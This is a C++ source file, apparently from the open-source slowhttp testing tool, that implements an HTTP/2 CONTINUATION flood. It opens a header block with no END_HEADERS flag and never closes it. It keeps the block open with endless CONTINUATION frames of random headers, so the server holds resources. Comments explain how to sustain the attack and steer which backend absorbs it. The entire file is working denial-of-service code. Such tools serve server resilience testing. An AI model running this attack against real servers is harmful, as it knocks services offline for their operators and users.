// SPDX-License-Identifier: Apache-2.0
// Copyright 2011-2026 Sergey Shekyan and contributors
#include "slowhttp/attacks/continuation.hpp"

#include <algorithm>

#include "slowhttp/http2.hpp"
#include "slowhttp/request.hpp"

namespace slowhttp {

namespace {

// One stream per connection, and only ever this one. RFC 7540 section 6.2: a
// HEADERS frame without END_HEADERS must be followed by CONTINUATION frames for
// the same stream and nothing else may be sent in between, on any stream. So a
// connection can carry exactly one unfinished header block, and opening a
// second stream would end the first -- which is the opposite of the intent.
constexpr std::uint32_t kStreamId = 1;

}  // namespace

ContinuationFlood::ContinuationFlood(const Config& cfg)
    : cfg_(cfg),
      interval_(std::chrono::duration_cast<std::chrono::milliseconds>(
          cfg.interval)),
      rng_(std::random_device{}()) {
  opening_ = opening();
}

void ContinuationFlood::on_open(ConnId /*id*/) {}

std::string ContinuationFlood::opening() const {
  std::string out;
  out += http2::kPreface;
  http2::write_frame(out, http2::FrameType::Settings, http2::kFlagNone, 0,
                     http2::settings_payload({{http2::kSettingsEnablePush, 0}}));

  // Same request as every other attack. What makes this one the CONTINUATION
  // flood is below: the header block is opened and never closed.
  //
  // The caller's headers are carried even though the block never completes,
  // because a server that routes or authenticates on headers reads them as they
  // arrive -- they decide which backend absorbs the flood.
  std::string block = RequestSpec::from(cfg_).serialize_http2();

  // Deliberately no END_HEADERS, and deliberately no END_STREAM. The block is
  // left open; everything after this is a CONTINUATION that also declines to
  // close it. This is the HTTP/2 spelling of a request that never sends its
  // final blank line.
  http2::write_frame(out, http2::FrameType::Headers, http2::kFlagNone,
                     kStreamId, block);
  return out;
}

std::string ContinuationFlood::random_token(int max_len) {
  static const char kAlphabet[] =
      "abcdefghijklmnopqrstuvwxyz0123456789";
  // Lowercase only: uppercase in a header name is malformed in HTTP/2 (RFC 7540
  // section 8.1.2) and a server is entitled to reject the block outright, which
  // would end the attack rather than sustain it.
  const int hi = max_len < 2 ? 2 : max_len;
  std::uniform_int_distribution<int> len_dist(1, hi);
  std::uniform_int_distribution<int> ch_dist(0, sizeof(kAlphabet) - 2);
  const int n = len_dist(rng_);
  std::string out;
  out.reserve(static_cast<std::size_t>(n));
  for (int i = 0; i < n; ++i) out.push_back(kAlphabet[ch_dist(rng_)]);
  return out;
}

std::string ContinuationFlood::fragment() {
  std::string block;
  http2::hpack_literal(block, "x-" + random_token(cfg_.max_random_data_len),
                       random_token(cfg_.max_random_data_len));
  std::string out;
  // Again without END_HEADERS. Setting it here would complete the block, hand
  // the server a well-formed request, and turn this into an ordinary slow
  // client.
  http2::write_frame(out, http2::FrameType::Continuation, http2::kFlagNone,
                     kStreamId, block);
  ++fragments_;
  return out;
}

Action ContinuationFlood::on_connect(ConnId /*id*/) {
  return Action::send(opening_, interval_);
}

Action ContinuationFlood::on_timer(ConnId /*id*/) {
  return Action::send(fragment(), interval_);
}

Action ContinuationFlood::on_readable(ConnId /*id*/, const char* /*data*/,
                                      std::size_t /*len*/) {
  // Anything arriving here is the server giving up -- a GOAWAY, or a reset of
  // the stream. Not parsed: the engine already notices the connection closing,
  // and that is the signal that matters.
  return Action::idle();
}

}  // namespace slowhttp
